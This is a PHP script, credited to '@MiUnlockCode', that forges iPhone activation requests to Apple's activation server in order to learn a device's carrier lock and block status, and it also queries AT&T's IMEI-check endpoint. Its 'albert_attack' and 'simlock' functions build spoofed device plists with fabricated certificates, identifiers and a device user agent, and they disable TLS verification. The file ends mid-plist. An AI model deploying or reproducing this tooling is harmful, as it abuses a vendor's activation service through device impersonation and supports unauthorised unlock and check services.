<?php
// Coded by @MiUnlockCode
define("DEBUG", false);
error_reporting(0); 
set_time_limit(0);

if(isset($_GET['imei']) && isset($_GET['sn'])) {
	$sn = $_GET['sn'];
    $imei = $_GET['imei'];
	$imei2 = $_GET['imei2'];

	
	if(empty($imei2) == false){ $inject_imei2 = "<strong>IMEI2:</strong> $imei2<br>";  }
	
    if (validate_imei($imei) == true){
		$imsi_tt=0; $imsi_nb=0; $imsi_nm="";
		$device=checkInfo($imei);
		
		$gsmcall = simlock($imei, $sn, null, $imei2);
		if($gsmcall == "TryMeid") { $meid = substr($imei, 0, -1); }
		if(empty($meid) == false){ $inject_meid = "<strong>MEID:</strong> $meid<br>";  }

		$gsmcall = simlock($imei, $sn, $meid, $imei2);
		if($gsmcall == 'Locked' || $gsmcall == 'Unlocked') {
			foreach(IMSI_ARRAY() as $isi) {
				$carrier = simlock($imei, $sn, $meid, $imei2, $isi);	
				if($carrier=="Unlocked") {
						$labelCar = imsiChecker($isi);
					$imsi_nb++;
				}
				$imsi_tt++;
			}
			
			if(($imsi_tt - $imsi_nb) == 0) {
				echo "Model:<span style='color:black;'> $device</span><br>Imei:<span style='color:black;'> $imei</span><br>Imei2:<span style='color:black;'> $imei2</span><br>Serial:<span style='color:black;'> $sn</span><br><br>
Next Tether Policy: 10<br>SimLock:<span style='color:green;'> $gsmcall</span>";
			} else {
				$status = "<span style='color:red;'> Locked</span>";
				echo "Model:<span style='color:black;'> $device</span><br>Imei:<span style='color:black;'> $imei</span><br>Imei2:<span style='color:black;'> $imei2</span><br>Serial:<span style='color:black;'> $sn</span><br>Carrier:<span style='color:black;'> $labelCar</span><br>SimLock:<span style='color:red;'>$status</span><br>";
			}
		} else {
			if($gsmcall == "chimaera"){
				echo "Model:<span style='color:black;'> $device</span><br>Imei:<span style='color:black;'> $imei</span><br>Imei2:<span style='color:black;'> $imei2</span><br>Serial:<span style='color:black;'> $sn</span><br>Next Tether Policy ID: Chimaera Device Policy 2365</span><br>Status:<span style='color:red;'> Blocked by Apple</span><br>";
			}else {
        echo 'Wrong IMEI or Server Down!';
	}
			//echo $gsmcall;
		}
    } else {
        echo 'Wrong IMEI';
	}
}
    
function checkInfo($imei) {
	$url="https://m.att.com/shopmobile/wireless/byop/checkIMEI.xhr.html ";
	$post_data = "_dynSessConf=23&%2Fatt%2Fecom%2Fshop%2Fview%2FValidateImeiFormHandler.imeiNumber=$imei&_D%3A%2Fatt%2Fecom%2Fshop%2Fview%2FValidateImeiFormHandler.imeiNumber=+&%2Fatt%2Fecom%2Fshop%2Fview%2FValidateImeiFormHandler.BYODSource=mobile&_D%3A%2Fatt%2Fecom%2Fshop%2Fview%2FValidateImeiFormHandler.BYODSource=+&%2Fatt%2Fecom%2Fshop%2Fview%2FValidateImeiFormHandler.sucessUrl=%2Fshopmobile%2Fwireless%2Fbyop%2FcheckIMEI%2Fjcr%3Acontent%2Fmaincontent%2Fimeiinfo.ajax.getImeiValidationResponse.xhr.html&_D%3A%2Fatt%2Fecom%2Fshop%2Fview%2FValidateImeiFormHandler.sucessUrl=+&%2Fatt%2Fecom%2Fshop%2Fview%2FValidateImeiFormHandler.validateImei=&_D%3A%2Fatt%2Fecom%2Fshop%2Fview%2FValidateImeiFormHandler.validateImei=+&_DARGS=%2Fshopmobile%2Fwireless%2Fbyop%2FcheckIMEI.xhr.html";
	
	$ch = curl_init(); 
	curl_setopt($ch, CURLOPT_URL , $url ); 
	curl_setopt($ch, CURLOPT_RETURNTRANSFER , 1); 
	curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-Type: application/x-www-form-urlencoded", "Content-Length: ".strlen($post_data)));
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_USERAGENT , "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36 OPR/58.0.3135.127" );
	curl_setopt($ch, CURLOPT_POST , 1); 
	curl_setopt($ch, CURLOPT_POSTFIELDS , $post_data); 
	
	$xml_response = curl_exec($ch); 
	if (curl_errno($ch)) { 
		$error_message = curl_error($ch); 
		$error_no = curl_errno($ch);

	//	echo "error_message: " . $error_message . "<br>";
	//	echo "error_no: " . $error_no . "<br>";
	}
	curl_close($ch);	
	
	if(strpos($xml_response, "deviceTitle") !== false) { 
		$device= json_decode($xml_response);
		$device=$device->deviceTitle;
		$device=str_replace(" - ", " ", $device);
		$device=str_replace("Apple ", "", $device);
		return $device;
	} else {
		return "Unknown";
	}
}

function IMSI_ARRAY() {

     return array('2321069', '2321170', '0839012', '3104101', '3102605', '2040400', '2343303', '2341590', '2400700', '2400111', '2400885', '2720303', '2940102', '4402011', '2163011', '2080111', '3027204','3114801');
}

function imsiChecker($imsi) {
if($imsi=='2321069')
  return 'AUSTRIA 3 HUTCHISON';
else if($imsi=='2321170')
  return 'A1 MOBILKOM AUSTRIA';
else if($imsi=='0839012') 
  return 'SPRINT USA'; 
else if($imsi=='3104101')
  return 'US AT&T Locked Activation Policy
<br>Next Tether Policy: 23<br>Country: United States';
else if($imsi=='3102605')
  return 'T-MOBILE USA';
else if($imsi=='2040400')
  return 'VERIZON USA'; 
else if($imsi=='2343303')
  return 'EE UK (TMOBILE/ORANGE)';
else if($imsi=='2341590')
  return 'VODAFONE UK';
else if($imsi=='2400700')
  return 'TELE2 SWEDEN';
else if($imsi=='2400111')
  return 'TELIA SWEDEN';
else if($imsi=='2400885')
  return 'TELENOR SWEDEN';
else if($imsi=='2720303') 
  return 'IRELAND METEOR';
else if($imsi=='2940102')
  return 'T-MOBILE MACEDONIA';
else if($imsi=='4402011')
  return 'SOFTBANK JAPAN';
else if($imsi=='2163011')
  return 'T-MOBILE HUNGARY';
else if($imsi=='2080111')
  return 'ORANGE FRANCE';
else if($imsi=='3027204')
  return 'CANADA ROGERS';
else if($imsi=='2040400')
  return 'VERIZON/TRACFONE USA';
else if($imsi=='2760111') 
  return 'ALBANIAN MOBILE';
else if($imsi=='2760311') 
  return 'EAGLE MOBILE';
else if($imsi=='2760211') 
  return 'VODAFONE';
else if($imsi=='2760411') 
  return 'PLUS AL';
else if($imsi=='6030111') 
  return 'ALGETEL';
else if($imsi=='6030311') 
  return 'NEDJMA';
else if($imsi=='6030211') 
  return 'ORASCOM';
else if($imsi=='2130311') 
  return 'MOBILAND';
else if($imsi=='6310211') 
  return 'UNITEL';
else if($imsi=='3654011') 
  return 'CABL&WI';
else if($imsi=='3650511') 
  return 'MOSSEL';
else if($imsi=='3651011') 
  return 'WEBLINK';
else if($imsi=='7161003') 
  return 'CLARO';
else if($imsi=='7161003') 
  return 'COMPALA';
else if($imsi=='7223101') 
  return 'CTI';
else if($imsi=='7220104') 
  return 'MOVISTAR';
else if($imsi=='7220211') 
  return 'NEXTEL';
else if($imsi=='7222011') 
  return 'NEXTEL2';
else if($imsi=='7223411') 
  return 'TELECOM';
else if($imsi=='7220711') 
  return 'TELEFONI';
else if($imsi=='7227011') 
  return 'TELFONIC';
else if($imsi=='2830134') 
  return 'ARMENTEL';
else if($imsi=='2830434') 
  return 'KARABAKH';
else if($imsi=='2831034') 
  return 'ORANGE';
else if($imsi=='2830534') 
  return 'VIVACELL';
else if($imsi=='5050610') 
  return '3';
else if($imsi=='5050210') 
  return 'OPTUS';
else if($imsi=='5050390') 
  return 'VODAFONE';
else if($imsi=='5051570') 
  return '3GIS';
else if($imsi=='5051470') 
  return 'AAPT';
else if($imsi=='5052470') 
  return 'ADVAN';
else if($imsi=='5058870') 
  return 'LOCALSTAR';
else if($imsi=='5050870') 
  return 'ONE';
else if($imsi=='5050534') 
  return 'OZITEL';
else if($imsi=='5057170') 
  return 'TELSTRA71';
else if($imsi=='5057270') 
  return 'TELSTRA72';
else if($imsi=='5051170') 
  return 'TELSTRA11';
else if($imsi=='5050134') 
  return 'TELSTRA';
else if($imsi=='2321070') 
  return '3HUTCH';
else if($imsi=='2320170') 
  return 'A1 TELEKOM';
else if($imsi=='2321570') 
  return 'BARABL';
else if($imsi=='2321170') 
  return 'BOBA1';
else if($imsi=='2320570') 
  return 'ONEORA';
else if($imsi=='2320770') 
  return 'TELERI';
else if($imsi=='2320370') 
  return 'T-MOBI LE';
else if($imsi=='2321270') 
  return 'YESORA';
else if($imsi=='2320588') 
  return 'ORANGE';
else if($imsi=='2321069') 
  return 'THREE';
else if($imsi=='5050970') 
  return 'AIRNET';
else if($imsi=='5050434') 
  return 'DEPART';
else if($imsi=='2570434') 
  return 'BEST';
else if($imsi=='2570134') 
  return 'MDC';
else if($imsi=='2270234') 
  return 'MTS';
else if($imsi=='2061034') 
  return 'BASE';
else if($imsi=='2060534') 
  return 'GLOBUL';
else if($imsi=='2061034') 
  return 'MOBISTAR';
else if($imsi=='2060134') 
  return 'PROXIMUS';
else if($imsi=='2062050') 
  return 'ORTEL';
else if($imsi=='2840179') 
  return 'MTEL';
else if($imsi=='2840310') 
  return 'VIVACOM';
else if($imsi=='2840510') 
  return 'GLOBUL';
else if($imsi=='3026104') 
  return 'BELL610';
else if($imsi=='3101703') 
  return 'BELLPACIFIC';
else if($imsi=='3023704') 
  return 'FIDO';
else if($imsi=='3027204') 
  return 'ROGERS';
else if($imsi=='3022204') 
  return 'TELUS220';
else if($imsi=='3026600') 
  return 'MTS';
else if($imsi=='3026102') 
  return 'VIRGIN';
else if($imsi=='3113700') 
  return 'USA';
else if($imsi=='7300304') 
  return 'CLARO';
else if($imsi=='7300104') 
  return 'ENTEL';
else if($imsi=='7301004') 
  return 'ENTEL10';
else if($imsi=='7300204') 
  return 'MOVISTAR';
else if($imsi=='4600202') 
  return 'MOBILE';
else if($imsi=='4600158') 
  return 'UNICOM';
else if($imsi=='2040438') 
  return 'TELECOM CHINA';
else if($imsi=='7320014') 
  return 'COLOMTEL';
else if($imsi=='7321014') 
  return 'COMCEL';
else if($imsi=='7320024') 
  return 'EDATEL';
else if($imsi=='7321234') 
  return 'MOVISTA3';
else if($imsi=='7321024') 
  return 'MOVISTAR';
else if($imsi=='7321114') 
  return 'TIGO1';
else if($imsi=='7321034') 
  return 'TIGO3';
else if($imsi=='2190199') 
  return 'T-MOBILE';
else if($imsi=='2191065') 
  return 'VIP';
else if($imsi=='2300434') 
  return 'MOBIKOM';
else if($imsi=='2300234') 
  return 'O2TELEFH';
else if($imsi=='2309834') 
  return 'SPRAVA';
else if($imsi=='2300134') 
  return 'TMOBI';
else if($imsi=='2300334') 
  return 'VODAFONE';
else if($imsi=='2309934') 
  return 'VODAF2';
else if($imsi=='2620125') 
  return 'TM';
else if($imsi=='2382010') 
  return 'DEMARK';
else if($imsi=='2380534') 
  return 'APS';
else if($imsi=='2380734') 
  return 'BARABLU';
else if($imsi=='2380634') 
  return 'H3G';
else if($imsi=='2380632') 
  return '3';
else if($imsi=='2380241') 
  return 'TELEN';
else if($imsi=='2380334') 
  return 'MIGWAY';
else if($imsi=='2380134') 
  return 'TDC';
else if($imsi=='2381034') 
  return 'TDC2';
else if($imsi=='2387734') 
  return 'TELENOR';
else if($imsi=='2382034') 
  return 'TELIA';
else if($imsi=='2383034') 
  return 'TELIA30';
else if($imsi=='7321234') 
  return 'MOVIL';
else if($imsi=='7400234') 
  return 'ALEGRO';
else if($imsi=='7400034') 
  return 'MOVISTA';
else if($imsi=='7400134') 
  return 'PORTA';
else if($imsi=='6020111') 
  return 'MOBINIL';
else if($imsi=='6020211') 
  return 'VODAFONE';
else if($imsi=='6020311') 
  return 'ETISALAT';
else if($imsi=='7061034') 
  return 'CLARO/CTE';
else if($imsi=='7060134') 
  return 'CTE/CLARO';
else if($imsi=='7060234') 
  return 'DIGICE';
else if($imsi=='7060434') 
  return 'MOVITA';
else if($imsi=='7060334') 
  return 'TELEMO';
else if($imsi=='2480134') 
  return 'EMT';
else if($imsi=='2440311') 
  return 'NDA';
else if($imsi=='2449111') 
  return 'SONERA';
else if($imsi=='2082136') 
  return 'BOUYGUES';
else if($imsi=='2082031') 
  return 'BT';
else if($imsi=='2080189') 
  return 'ORANGE';
else if($imsi=='2082011') 
  return 'BOUYGUES20';
else if($imsi=='2082111') 
  return 'BOUYGUES21';
else if($imsi=='2088811') 
  return 'BOUYGUES88';
else if($imsi=='2080111') 
  return 'ORANGE01';
else if($imsi=='2080211') 
  return 'ORANGE02';
else if($imsi=='2081011') 
  return 'SFR10';
else if($imsi=='2081111') 
  return 'SFR11';
else if($imsi=='2081031') 
  return 'SFR';
else if($imsi=='2081003') 
  return 'SFR';
else if($imsi=='2080191') 
  return 'VIRGIN';
else if($imsi=='2620111') 
  return 'T-MOBILE';
else if($imsi=='2620208') 
  return 'VODAFONE';
else if($imsi=='2020134') 
  return 'COSMOTE';
else if($imsi=='2020934') 
  return 'QTELECOM';
else if($imsi=='2020534') 
  return 'VODAFONE';
else if($imsi=='2021034') 
  return 'WIND';
else if($imsi=='7080111') 
  return 'CLARO';
else if($imsi=='2163011') 
  return 'T-MOBILE';
else if($imsi=='2167000') 
  return 'VODAFONE';
else if($imsi=='4040211') 
  return 'AIRTEL02';
else if($imsi=='4040111') 
  return 'VODAF01';
else if($imsi=='4040511') 
  return 'VODAF05';
else if($imsi=='4044611') 
  return 'VODAF46';
else if($imsi=='2720110') 
  return 'VODAFONE';
else if($imsi=='2720211') 
  return 'O2';
else if($imsi=='2720320') 
  return 'E-MOBILE';
else if($imsi=='2720303') 
  return 'METEOR';
else if($imsi=='2720500') 
  return '3';
else if($imsi=='2229834') 
  return 'BLU';
else if($imsi=='2220234') 
  return 'ELSACOM';
else if($imsi=='2229934') 
  return 'H3G';
else if($imsi=='2227734') 
  return 'IPSE';
else if($imsi=='2220134') 
  return 'TELECOM';
else if($imsi=='2220134') 
  return 'TIM';
else if($imsi=='2221034') 
  return 'VODAFONE';
else if($imsi=='2228834') 
  return 'WIND';
else if($imsi=='4540492') 
  return 'AU KIDDI 4S';
else if($imsi=='4405000') 
  return 'AU KIDDI 5G';
else if($imsi=='4402081') 
  return 'SOFTBANK 4S/5G';
else if($imsi=='4405014') 
  return 'AU KDDI IPHONE5';
else if($imsi=='4167711') 
  return 'ORANGE';
else if($imsi=='4500826') 
  return 'TELECOME';
else if($imsi=='2950211') 
  return 'ORANGE';
else if($imsi=='2950111') 
  return 'SWISCO';
else if($imsi=='2460165') 
  return 'OMNITEL';
else if($imsi=='2460165') 
  return 'OMNITEL';
else if($imsi=='2700101') 
  return 'LUXGSM';
else if($imsi=='2707701') 
  return 'TANGO';
else if($imsi=='2709901') 
  return 'VOXMOBI';
else if($imsi=='4550234') 
  return 'CHINA';
else if($imsi=='4550134') 
  return 'CMT';
else if($imsi=='4550534') 
  return 'HUTCHIS';
else if($imsi=='4550034') 
  return 'SMARTT';
else if($imsi=='2940387') 
  return 'VIP';
else if($imsi=='2940200') 
  return 'ONE(EX-COSMOFON)';
else if($imsi=='2940102') 
  return 'T-MOBILE';
else if($imsi=='3340202') 
  return 'TELCEL';
else if($imsi=='3340100') 
  return 'NEXTEL';
else if($imsi=='3340500') 
  return 'LUSACELL';
else if($imsi=='3340300') 
  return 'MOVISTAR';
else if($imsi=='3340202') 
  return 'AMERICA MOVIL';
else if($imsi=='2590101') 
  return 'ORANGE';
else if($imsi=='2970200') 
  return 'T-MOBILE';
else if($imsi=='2041611') 
  return 'T-MOBILE';
else if($imsi=='5300134') 
  return 'RESERVE';
else if($imsi=='2040438') 
  return 'VODAFONE';
else if($imsi=='5302834') 
  return 'ECONET';
else if($imsi=='5302434') 
  return 'NZCOMUNIC';
else if($imsi=='5300534') 
  return 'TELECOM';
else if($imsi=='5300434') 
  return 'TELTRACLE';
else if($imsi=='5300134') 
  return 'VODAFONE';
else if($imsi=='5300334') 
  return 'WOOSH';
else if($imsi=='2420211') 
  return 'NETCOM';
else if($imsi=='2420111') 
  return 'TELENOR';
else if($imsi=='2400768') 
  return 'TELE2';
else if($imsi=='7161011') 
  return 'CLARO';
else if($imsi=='7161011') 
  return 'TIM';
else if($imsi=='5150220') 
  return 'GB';
else if($imsi=='5150303') 
  return 'SM';
else if($imsi=='5150509') 
  return 'SUN';
else if($imsi=='5150211') 
  return 'GLOBE';
else if($imsi=='2600211') 
  return 'ERA';
else if($imsi=='2600311') 
  return 'ORANGE';
else if($imsi=='2600200') 
  return 'T-MOBILE';
else if($imsi=='2680311') 
  return 'OPTIMUS';
else if($imsi=='2680111') 
  return 'VODAFONE';
else if($imsi=='2680611') 
  return 'TMN';
else if($imsi=='2260107') 
  return 'VODAFONE';
else if($imsi=='2261007') 
  return 'ORANGE';
else if($imsi=='2260307') 
  return 'COSMOTE';
else if($imsi=='2260407') 
  return 'ZAPP';
else if($imsi=='2502834') 
  return 'BEELINE28';
else if($imsi=='2509934') 
  return 'BEELINE99';
else if($imsi=='2500234') 
  return 'MEGAFON';
else if($imsi=='2501034') 
  return 'MTS10';
else if($imsi=='2509334') 
  return 'TELECOM';
else if($imsi=='4200734') 
  return 'EAE';
else if($imsi=='4200334') 
  return 'MOBILY';
else if($imsi=='4200134') 
  return 'STC';
else if($imsi=='4200434') 
  return 'ZAINSA';
else if($imsi=='2310411') 
  return 'T-MOBILE 2';
else if($imsi=='2310234') 
  return 'EUROTEL 2';
else if($imsi=='2310134') 
  return 'ORANGE';
else if($imsi=='2310534') 
  return 'ORANGE UMT';
else if($imsi=='2311534') 
  return 'ORANGE UMT2';
else if($imsi=='2310634') 
  return 'TELEFICO2';
else if($imsi=='6550134') 
  return 'VODACOM';
else if($imsi=='2934001') 
  return 'SI-MOBILE';
else if($imsi=='2140711') 
  return 'MOVISTAR';
else if($imsi=='2140333') 
  return 'ORANGE';
else if($imsi=='2140198') 
  return 'VODAFONE';
else if($imsi=='2140401') 
  return 'YOIGO';
else if($imsi=='2400200') 
  return '3';
else if($imsi=='2400111') 
  return 'TELIA';
else if($imsi=='2400700') 
  return 'TELE2';
else if($imsi=='2400100') 
  return 'TELIA';
else if($imsi=='2400885') 
  return 'TELENOR';
else if($imsi=='2280167') 
  return 'SWISSCOM';
else if($imsi=='2280311') 
  return 'ORANGE';
else if($imsi=='2280200') 
  return 'SUNRISE';
else if($imsi=='2280111') 
  return 'SWISCOM';
else if($imsi=='2280211') 
  return 'SUNRISE';
else if($imsi=='2280121') 
  return 'SWISCOM (UNOFFICAL)';
else if($imsi=='4669234') 
  return 'CHUNGWA';
else if($imsi=='2860134') 
  return 'TURCELL';
else if($imsi=='2860211') 
  return 'VODAFONE';
else if($imsi=='2862034') 
  return 'VODAFONE';
else if($imsi=='4240334') 
  return 'DU';
else if($imsi=='4240234') 
  return 'ETISAL';
else if($imsi=='2342091') 
  return '3';
else if($imsi=='2341091') 
  return 'O2';
else if($imsi=='2343320') 
  return 'ORANGE/T-MOBILE';
else if($imsi=='2341590') 
  return 'VODAFONE 2';
else if($imsi=='2340211') 
  return 'O2 – 2';
else if($imsi=='2343334') 
  return 'ORANGE33';
else if($imsi=='2343091') 
  return 'T-MOBILE';
else if($imsi=='2343091') 
  return 'ORANGE';
else if($imsi=='2343091') 
  return 'EE';
else if($imsi=='2340100') 
  return 'VECTONE';
else if($imsi=='7481011') 
  return 'CTIMOV';
else if($imsi=='7480711') 
  return 'MOVISTAR';
else if($imsi=='7480111') 
  return 'ANTEL';
else if($imsi=='3104101') 
  return 'ATT';
else if($imsi=='2040400') 
  return 'VERIZON';
else if($imsi=='3160101') 
  return 'SPRINT(CDMA)';
else if($imsi=='3461401') 
  return 'CABLE&WIRELESS LIME';
else if($imsi=='3101200') 
  return 'SPRINT IPHONE5';
else if($imsi=='2040400')
  return 'CRICKET';
else if($imsi=='3101200') 
  return 'VIRGIN IPHONE5';
else if($imsi=='2040400') 
  return 'STRAIGHT TALK';
else if($imsi=='3102605') 
  return 'T-MOBILE IPHONE5';
else if($imsi=='3113700') 
  return 'WIRELESS ALASKA';
else if($imsi=='3102620') 
  return 'T-MOBILE';
else if($imsi=='3114801') 
  return 'TRACFONE';
else if($imsi=='3102600') 
  return 'METROPCS';
else if($imsi=='3114801') 
  return 'TOTAL WIRELESS';
else if($imsi=='3104101') 
  return 'CONSUMER CELULLAR';
else if($imsi=='3114801') 
  return 'STRAIGHT TALK';
else if($imsi=='3160101') 
  return 'BOOST MOBILE';
else if($imsi=='2040400') 
  return 'XFINITY';
else if($imsi=='7340486') 
  return 'MOVISTAR';
else if($imsi=='7340200') 
  return 'DIGITEL';
else if($imsi=='7340600') 
  return 'MOVILNET';
else if($imsi=='7340400') 
  return 'TELEFONICA';
else  
  return 'OTHER';
}

function validate_imei($imei) {
	if (!preg_match('/^[0-9]{15}$/', $imei)) return false;
	$sum = 0;
	for ($i = 0; $i < 14; $i++)
	{
		$num = $imei[$i];
		if (($i % 2) != 0)
		{
			$num = $imei[$i] * 2;
			if ($num > 9)
			{
				$num = (string) $num;
				$num = $num[0] + $num[1];
			}
		}
		$sum += $num;
	}
	if ((($sum + $imei[14]) % 10) != 0) return false;
	return true;
}

function match_all($needles, $haystack) {
    if(empty($needles)){
        return false;
    }

    foreach($needles as $needle) {
        if (strpos($haystack, $needle) == false) {
            return false;
        }
    }
    return true;
}

function albert_attack($query) {
	$url = "https://albert.apple.com/deviceservices/deviceActivation";
			
	$test = urlencode(base64_encode($query));
    $post_data = "passcode=gfdgf&activation-info-base64=$test";
	
	$ch = curl_init(); 
	curl_setopt($ch, CURLOPT_URL , $url ); 
	curl_setopt($ch, CURLOPT_RETURNTRANSFER , 1); 
	curl_setopt($ch, CURLOPT_TIMEOUT , 10); 
	curl_setopt($ch, CURLOPT_VERBOSE, 0);
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-Type: application/x-www-form-urlencoded", "Content-Length: ".strlen($post_data)));
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_USERAGENT , "iOS 11.1.1 15B150 iPhone Setup Assistant iOS Device Activator (MobileActivation-286.20.3 built on Sep 29 2017 at 18:51:08)" );
	curl_setopt($ch, CURLOPT_POST , 1); 
	curl_setopt($ch, CURLOPT_POSTFIELDS , $post_data );  
	
	$xml_response = curl_exec($ch); 	
	if (curl_errno($ch)) { 
		$error_message = curl_error($ch); 
		$error_no = curl_errno($ch);

	//	echo "error_message: " . $error_message . "<br>";
	//	echo "error_no: " . $error_no . "<br>";
	}
	curl_close($ch);
	
	if(DEBUG){ print_r($xml_response)."</br>"; die(); }
	
	$aclock = array('SIM','Not','Supported');
	$problemiphone = array('Please','restore','the','phone','and','install','the','latest','version','of','iOS');
	$problemiphone1 = array('Device','Unknown');
	$problemiphone2 = array('There', 'is', 'a', 'problem', 'with', 'your', 'iPhone.');
	$problemiphone3 = array('There', 'is', 'a', 'problem', 'with', 'this', 'iPhone.');	
	$activationerror = array('This','iPhone','is','not','able','to','complete','the','activation','process');
	$unsupportedsim =  array('Unsupported','SIM');
	$icloudLocked =  array('This','iPhone', 'is', 'linked');
	$errorUnlocked = array('Activation', 'could');
	//Activation could not be completed
	if(match_all($aclock,$xml_response)) {
		return "Locked";
	} else if (match_all($problemiphone,$xml_response)) {
		return "Unlocked";
	} else if (match_all($problemiphone2,$xml_response)) {
		return "chimaera";
	} else if (match_all($problemiphone3,$xml_response)) {
		return "chimaera";
	} else if (match_all($icloudLocked,$xml_response)) {
		return "Unlocked";
	} else if (match_all($errorUnlocked,$xml_response)) {
		return "Unlocked";
	} else if (strpos($xml_response, "AccountToken")!==false) {
    	return "Unlocked";
   	} else if (match_all($activationerror,$xml_response)) {
		return "TryMeid";
	} else {
		print_r($xml_response);
		//return "IDK BRO";
	}
}

function simlock($imei, $sn, $meid, $imei2, $imsi = '6030326') {
	if(isset($meid)) {
		$meid = '<key>MobileEquipmentIdentifier</key>
			<string>'.$meid.'</string>';
	}
	
	if(empty($imei2)==false) {
		$imei2 = '<key>InternationalMobileEquipmentIdentity2</key>
			<string>'.$imei2.'</string>';
	}
	
	$ActivationInfoXML = 
'<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>ActivationRequestInfo</key>
	<dict>
		<key>ActivationRandomness</key>
		<string>24535014-9805-49AA-AC5C-2DD8EB69B12A</string>
		<key>ActivationState</key>
		<string>Unactivated</string>
		<key>FMiPAccountExists</key>
		<true/>
	</dict>
	<key>BasebandRequestInfo</key>
	<dict>
		<key>ActivationRequiresActivationTicket</key>
		<true/>
		<key>BasebandActivationTicketVersion</key>
		<string>V2</string>
		<key>BasebandChipID</key>
		<integer>7282913</integer>
		<key>BasebandMasterKeyHash</key>
		<string>AEA5CCE143668D0EFB4CE1F2C94C966A6496C6AA</string>
		<key>BasebandSerialNumber</key>
		<data>
		NE5Ksw==
		</data>
		<key>GID1</key>
		<string>90ffffff</string>
		<key>GID2</key>
		<string>ffffffff</string>
		<key>IntegratedCircuitCardIdentity</key>
		<string>8938641090306391573</string>
		<key>InternationalMobileEquipmentIdentity</key>
		<string>'.$imei.'</string>
		'.$imei2.'
		<key>InternationalMobileSubscriberIdentity</key>
		<string>'.$imsi.'73956326</string>
		'.$meid.'
		<key>PhoneNumber</key>
		<string></string>
		<key>SIMStatus</key>
		<string>kCTSIMSupportSIMStatusReady</string>
		<key>SupportsPostponement</key>
		<true/>
		<key>kCTPostponementInfoPRIVersion</key>
		<string>0.1.144</string>
		<key>kCTPostponementInfoPRLName</key>
		<integer>0</integer>
		<key>kCTPostponementInfoServiceProvisioningState</key>
		<true/>
	</dict>
	<key>DeviceCertRequest</key>
	<data>
	LS0tLS1CRUdJTiBDRVJUSUZJQ0FURSBSRVFVRVNULS0tLS0KTUlJQnhEQ0NBUzBDQVFB
	d2dZTXhMVEFyQmdOVkJBTVRKRGN3TURGQk1UWTBMVGxHUkRBdE5EaEJNUzFCTVRFeg0K
	TFRjNVJUaEdNVFF5UXprelFURUxNQWtHQTFVRUJoTUNWVk14Q3pBSkJnTlZCQWdUQWtO
	Qk1SSXdFQVlEVlFRSA0KRXdsRGRYQmxjblJwYm04eEV6QVJCZ05WQkFvVENrRndjR3hs
	SUVsdVl5NHhEekFOQmdOVkJBc1RCbWxRYUc5dQ0KWlRDQm56QU5CZ2txaGtpRzl3MEJB
	UUVGQUFPQmpRQXdnWWtDZ1lFQTdNV1I0T3VJUG81NEowczhmMkQ4bnRtYw0KYWVkOGNu
	NENCM2p2bzZjY2hQQTJSSGV4TDVxVU5YblZNZzhHUmVLN1RCSmZFcDBYaVpmMlR5TTRT
	QXFjL2VLUg0KbEIzdFFUdGJhYjQ4UkxDenljUWlHelhoZXk0R0w0ckoxQTV3ditXUUYw
	YmtVcDhzUUk4b3VoMnFKU3ZiaWp6Rg0KOTE4d2d1aWZsZUJZcGRaMjBEMENBd0VBQWFB
	QU1BMEdDU3FHU0liM0RRRUJCUVVBQTRHQkFOVFRhVkZHMnZJag0KZ0J5Zkp6d1U4ZStD
	MXBqYzNKMWJvL1FjeXU2SDZ2aDBYZHNPMk9qOFBiUWRBY09teUJyTG50QTVhT2ZsY1pp
	Qw0KMmJQSjhiNFBmVVRVWkJxQVdCS0JodFF6QjVVWDRuZDhsTTVKeDc3c0VwVC9uTjdQ
	NDhZQmgyWlJqaDg4SmQrcg0KdDFwWnZ3VWxWYTZwRVJ2N2RWTDZNM3pGRmNwQVBhejcK
	LS0tLS1FTkQgQ0VSVElGSUNBVEUgUkVRVUVTVC0tLS0t
	</data>
	<key>DeviceID</key>
	<dict>
		<key>SerialNumber</key>
		<string>'.$sn.'</string>
		<key>UniqueDeviceID</key>
		<string>cbed4ff1e95edba585a94f4e8d333379f282df9e</string>
	</dict>
	<key>DeviceInfo</key>
	<dict>
		<key>BuildVersion</key>
		<string>15A372</string>
		<key>DeviceClass</key>
		<string>iPhone</string>
		<key>DeviceVariant</key>
		<string>A</string>
		<key>ModelNumber</key>
		<string>MKQM2</string>
		<key>OSType</key>
		<string>iPhone OS</string>
		<key>ProductType</key>
		<string>iPhone8,1</string>
		<key>ProductVersion</key>
		<string>11.0</string>
		<key>RegionCode</key>
		<string>ZD</string>
		<key>RegionInfo</key>
		<string>ZD/A</string>
		<key>RegulatoryModelNumber</key>
		<string>A1784</string>
		<key>UniqueChipID</key>
		<integer>2859022370934054</integer>
	</dict>
	<key>RegulatoryImages</key>
	<dict>
		<key>DeviceVariant</key>
		<string>A</string>
	</dict>
	<key>UIKCertification</key>
	<dict>
		<key>BluetoothAddress</key>
		<string>bc:4c:c4:14:58:ac</string>
		<key>BoardId</key>
		<integer>14</integer>
		<key>ChipID</key>
		<integer>35152</integer>
		<key>EthernetMacAddress</key>
		<string>bc:4c:c4:14:58:ad</string>
		<key>UIKCertification</key>
		<data>
		MIICxjCCAm0CAQEwADCB2QIBATAKBggqhkjOPQQDAgNHADBEAiBOmykQ378M
		lvcKVkyjlHoYwKN8/WK/lHGv2zscJxnE+AIgN9zrZRpE0K7RZuZtruXkgFxV
		iM4SXByiyOPFmBdcy+MwWzAVBgcqhkjOPQIBoAoGCCqGSM49AwEHA0IABFNT
		gwNJnJnk05h2j2K9p75U96PvOBiti2J0nQNXeKWGKizCqergjKtHZqAtVBsX
		mdd3311pxQ75CsX3EUaznAagCgQIYWNzc0gAAACiFgQUfYSpUwwmRfMbGkRA
		Ps1aKCLT0dwwgcICAQEwCgYIKoZIzj0EAwIDSAAwRQIhAPDzRlZqRnm9wRmT
